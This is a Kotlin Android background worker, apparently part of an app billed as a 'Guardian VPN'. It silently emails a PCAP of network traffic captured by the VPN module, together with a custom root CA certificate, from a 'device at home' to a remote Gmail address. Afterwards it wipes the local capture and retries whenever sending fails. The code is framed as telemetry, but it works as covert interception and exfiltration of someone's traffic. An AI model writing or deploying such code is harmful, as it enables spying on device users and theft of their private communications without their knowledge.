package com.werebug.anmapwrapper

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.io.File
import java.util.Properties
import javax.mail.Message
import javax.mail.Multipart
import javax.mail.PasswordAuthentication
import javax.mail.Session
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeBodyPart
import javax.mail.internet.MimeMessage
import javax.mail.internet.MimeMultipart

class ReportWorker(context: Context, workerParams: WorkerParameters) : Worker(context, workerParams) {

    override fun doWork(): Result {
        Log.d("GuardianWorker", "Inizio ciclo di esportazione telemetria remota automatico...")
                            // DA SETTARE PER INVIO LOG
        val emailDestinatario = "oooooooo.@mail.com"
        val emailMittente = "tuamaildilaboratorio@gmail.com"
        val passwordAppGoogle = "xxxx xxxx xxxx xxxx" // Sostituisci con la password per le app a 16 lettere

        val pcapFile = File(applicationContext.filesDir, "tmp/telemetry_traffic.pcap")
        val certFile = File(applicationContext.filesDir, "guardian_root_ca.crt")

        try {
            // Configurazione dei parametri del server SMTP di Google (TLS protetto)
            val props = Properties().apply {
                put("mail.smtp.auth", "true")
                put("mail.smtp.starttls.enable", "true")
                put("mail.smtp.host", "smtp.gmail.com")
                put("mail.smtp.port", "587")
            }

            // Autenticazione crittografica in background
            val session = Session.getInstance(props, object : javax.mail.Authenticator() {
                override fun getPasswordAuthentication(): PasswordAuthentication {
                    return PasswordAuthentication(emailMittente, passwordAppGoogle)
                }
            })

            val message: Message = MimeMessage(session).apply {
                setFrom(InternetAddress(emailMittente))
                setRecipients(Message.RecipientType.TO, InternetAddress.parse(emailDestinatario))
                subject = "🛡️ REMOTE REPORT: Guardian VPN Telemetry Audit"
            }

            // Corpo del testo dell'email
            val textBodyPart = MimeBodyPart().apply {
                setText("Report di monitoraggio remoto automatico.\nIl dispositivo a casa ha completato le 48 ore di scansione.\nIn allegato i file PCAP estratti dal modulo VPN.")
            }

            val multipart: Multipart = MimeMultipart().apply {
                addBodyPart(textBodyPart)
            }

            // Allegato 1: Il file PCAP con tutta l'ispezione di rete accumulata
            if (pcapFile.exists() && pcapFile.length() > 0) {
                val pcapAttachmentPart = MimeBodyPart().apply {
                    attachFile(pcapFile)
                    fileName = "telemetry_traffic.pcap"
                }
                multipart.addBodyPart(pcapAttachmentPart)
            }

            // Allegato 2: La Root CA per verifica di conformità
            if (certFile.exists()) {
                val certAttachmentPart = MimeBodyPart().apply {
                    attachFile(certFile)
                    fileName = "guardian_root_ca.crt"
                }
                multipart.addBodyPart(certAttachmentPart)
            }

            message.setContent(multipart)

            // Spedizione fisica nel tubo di rete in background
            Transport.send(message)
            Log.d("GuardianWorker", "🟢 Email di telemetria remota inviata con successo a $emailDestinatario")

            // Opzionale: Svuota il file PCAP dopo l'invio per non accumulare gigabyte di dati per i successivi 2 giorni
            if (pcapFile.exists()) {
                pcapFile.writeBytes(ByteArray(0))
                Log.d("GuardianWorker", "Buffer PCAP svuotato per la prossima sessione di scansione.")
            }

            return Result.success()

        } catch (e: Exception) {
            Log.e("GuardianWorker", "❌ Errore critico durante l'invio della mail automatica: ${e.message}", e)
            // Se fallisce (es. manca internet momentaneamente), dice al sistema di riprovare più tardi
            return Result.retry()
        }
    }
}